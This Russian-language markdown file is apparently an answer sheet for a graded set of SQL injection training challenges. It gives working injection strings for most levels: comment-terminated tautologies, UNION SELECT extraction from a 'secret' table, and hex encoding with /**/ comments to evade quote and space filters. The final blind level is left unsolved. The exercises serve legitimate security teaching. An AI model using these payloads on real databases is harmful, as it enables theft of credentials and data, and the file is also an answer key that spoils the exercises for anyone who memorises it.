## SQL Injections

- **1. Таблица:** users  
   **Поля:** id, login, pass  
   **Задача:** пароль пользователя с id=12:  
   ```SELECT * FROM users WHERE id=12 ```



- **2. Таблица:** users  
  **Поля:** id, login, pass  
  **Запрос:** SELECT * FROM users WHERE id=2 OR login='$text' (вместо $text подставляется введённое ниже значение)  
  **Задача:** пароль пользователя с id=9  
  ```$text = ' OR id=9-- '```


- **3. Таблица:** users  
  **Поля:** id, login, pass  
  **Запрос:** SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1  
  **Задача:** пароль пользователя с id=13  
  ```$text = ' OR id=13-- '```  


- **4. Таблицы:** users, secret  
  **Поля** таблицы users: id, login, pass  
  В таблице secret три поля  
  **Запрос:** SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1  
  **Задача:** данные из таблицы secret с полем ggg='abc'  
  ```$text = ' UNION SELECT * FROM secret WHERE ggg='abc'-- '```


- **5. Таблицы:** users, secret  
  **Поля** таблицы users: id, login, pass  
  В таблице secret два поля  
  **Запрос:** SELECT * FROM users WHERE id=2 OR login='$text' LIMIT 1  
  **Задача:** данные из таблицы secret  
  ```$text = ' UNION SELECT *,1 FROM secret-- '```  


- **6. Таблицы:** users  
  **Поля:** id, login, pass  
  **Запрос:** SELECT * FROM users WHERE id=$text LIMIT 1  
  **Подсказка:** база пользователей стала дли-и-и-инная  
  Теперь всегда выводится только первая строка ответа (вне зависимости от того, сколько вернул SQL-запрос)  
  Фильтруются кавычки (' и ")  
  **Задача:** пароль пользователя с логином god  
  ```$text = 10000 OR login = 0x676f64```
  
- **7. Таблицы:** users  
  **Поля:** id, login, pass  
  **Запрос:** SELECT * FROM users WHERE id=$text LIMIT 1  
  Теперь всегда выводится только первая строка ответа (вне зависимости от того, сколько вернул SQL-запрос)   
  Фильтруются символы ', ", +, =, запятая, пробел, скобки  
  **Задача:** пароль пользователя с логином, содержащим подстроку gentoo  
  ```$text = 10000/**/or/**/login/**/like/**/0x2567656e746f6f25```  

- **8. Таблицы:** users  
  **Поля:** id, login, pass  
  **Запрос:** SELECT * FROM users WHERE id=$text  
  Выводит только количество записей  
  **Задача:** пароль пользователя с логином fast
  
